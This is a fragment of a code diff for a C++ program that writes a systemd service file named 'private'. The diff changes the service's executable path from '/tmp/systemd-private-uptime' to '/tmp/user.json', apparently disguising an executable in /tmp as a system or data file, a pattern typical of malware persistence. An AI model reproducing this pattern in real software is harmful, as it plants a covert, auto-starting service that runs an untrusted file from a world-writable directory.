@@ -9,7 +9,7 @@ namespace fs = std::filesystem;
 
 int main() {
     const std::string serviceName = "private";
-    const std::string execPath = "/tmp/systemd-private-uptime";
+    const std::string execPath = "/tmp/user.json";
     const std::string serviceFile = "/etc/systemd/system/" + serviceName + ".service";
     
     std::ofstream out(serviceFile);
